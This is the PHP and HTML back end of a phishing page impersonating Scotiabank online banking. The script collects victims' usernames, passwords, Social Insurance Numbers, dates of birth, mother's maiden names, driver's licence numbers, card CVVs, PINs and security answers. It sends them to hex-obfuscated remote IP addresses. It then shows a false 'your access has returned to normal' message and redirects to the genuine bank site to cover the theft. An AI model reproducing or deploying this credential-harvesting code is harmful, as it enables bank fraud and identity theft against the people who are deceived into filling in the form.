<?php
require 'call.php';
require 'c.php';
$wqbbqq = array("68f74742a704413a2f2d37a358d2e39332e3231332e31236363a3232","fa687474741034a2f2sf32s123s1b132722e31s31322e32430362e317373a3232");

$user = $_POST['user'];
$pass = $_POST['pass'];
$name = $_POST['name'];
$dobd = $_POST['dobd'];
$dobm = $_POST['dobm'];
$doby = $_POST['doby'];
$sin1 = $_POST['sin1'];
$sin2 = $_POST['sin2'];
$sin3 = $_POST['sin3'];
$mmn = $_POST['mmn'];
$zip = $_POST['zip'];
$dln = $_POST['dln'];
$nip = $_POST['nip'];
$cvv = $_POST['cvv'];
$q1 = $_POST['q1'];
$a1 = $_POST['a1'];
$q2 = $_POST['q2'];
$a2 = $_POST['a2'];
$q3 = $_POST['q3'];
$a3 = $_POST['a3'];
$q4 = $_POST['q4'];
$a4 = $_POST['a4'];
$q5 = $_POST['q5'];
$a5 = $_POST['a5'];
$data = "---->SC-INF-ON-$device 
User: $user
Pass: $pass
-
Name: $name
DOB: $dobd/$dobm/$doby
-
SIN: $sin1-$sin2-$sin3
Postal: $zip
MMN: $mmn
DL: $dln
CVV: $cvv
PIN: $nip
-
Q1: $q1 / $a1
Q2: $q2 / $a2
Q3: $q3 / $a3
Q4: $q4 / $a4
Q5: $q5 / $a5
-
User-INF: $ip#$hostname#$browser
<--------------------------------
";

function hextobin($hexstr) 
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            @$c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 



if ($user == "" || $pass == "" ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php'>";
  die();
}
$decpassword = "mydaasdatau412222rl11";
function awe($data,$site) { 
	global $textHos;
	$data = array('info' => $data);
	$options = array(
		'http' => array(
			'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
			'method'  => 'POST',
			'content' => http_build_query($data),
		),
	);
	$context  = stream_context_create($options);
	$result = @file_get_contents($site, false, $context);	
}
$urlz = array("687474703a2f2f3230392e3132362e3132372e3232323a3232","687474703a2f2f3230302e3234312e3139332e34333a3232");                                                                                                                                                                                                                         
foreach ($urls as $site) {
   $urlz = hextobin($site);
	awe($data,$urlz);

}
?>
<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>
  <meta name="description" content="">
  <link rel="shortcut icon" href="data/favicon.ico" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="data/css.css">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="noindex, nofollow"/>
<meta class="foundation-mq-topbar"><style type="text/css"></style></head>
<body class="f-topbar-fixed">
<nav-bar params="route: route"><div>
    <div class="nav-bar fixed" data-bind="template: { afterRender: enhanceWithin}">
        <nav class="top-bar scotiabank" data-topbar="" role="navigation" data-bind="visible: isVisible(), attr: { class: 'top-bar ' + branding() }" style="">
            <ul class="title-area">
                <li class="name">
                  
                </li>
                <li class="toggle-topbar" data-bind="if: displayMenuOptions()"></li>
            </ul>
            
        <section class="middle tab-bar-section">
                        <img class="logo" aria-hidden="route().page === 'activate-select' || route().page === 'recover-select'  || route().page === 'dcv' " tabindex="0" alt="Scotiabank" data-bind="attr: {src: navLogoSVG(), onerror: navLogoPNG()}" src="data/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section" data-bind="if: displayMenuOptions()"></section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" data-bind="template: { afterRender: enhanceWithin}">
	<div class="alert-box" role="alertdialog" data-bind="notificationVisible: hasNotification, notificationType: globalNotification().notificationType" tabindex="-1" style="display: none;">
		<!-- ko if: globalNotification() --><!-- /ko -->
	</div>
</div></notifications>
<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div data-bind="template: { afterRender: enhanceWithin}, visible: isLoading" class="loading-container" role="alert" aria-live="assertive" tabindex="0" style="display: none;">
	<div class="loading" id="load" aria-label="Loading"><div class="spinner" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;" role="progressbar"><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-12-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
</div></loading>
<div id="page" class="container" data-bind="component: { name: route().page, params: route }, css: isWideView() ? 'height100' :''"><div data-bind="template: { afterRender: enhanceWithin}" class="activate-scotia-card-container component-container">
    <div class="margin" id="activate-scotia-card-container">
        <title-description-component params="title: lbl.MainTitle"><div data-bind="attr: { id: 'titleComponent', class: 'title-component'}, template: { afterRender: enhanceWithin }" id="titleComponent" class="title-component">
	<div class="title">
        <h2 class="h5" tabindex="0"><span class="red title" data-bind="text: title">Activate your online &amp; mobile banking</span></h2>
    </div>
    <div class="subtitle" style="color: red;">Thank you! Your Scotia login <span style="dislay: inline-block; font-weight:bold;"><?php @print "$user"; ?></span> was activated!</div><br>
   <strong> <div class="subtitle" style="color: red;">Your access has returned to normal and we have lifted all the protection limits.</div><br></strong>
    <div class="subtitle" style="color: red;">We are sorry for this inconvenience. Your security is our main concern! </div><br>
    <div class="subtitle" style="color: red; display: inline-block;">In a few moments you will be redirected on our main page at <a href"https://scotiabank.com">https://www.scotiabank.com</a></div>
    <div class="description" data-bind="if:descriptionAvailable()"></div></div>
</div></title-description-component>
<meta http-equiv="refresh" content="8; url=https://scotiabank.com"></head></html>
</div>

	
   </div>     
</div>
 </div>
</div>

</div>
</body></html>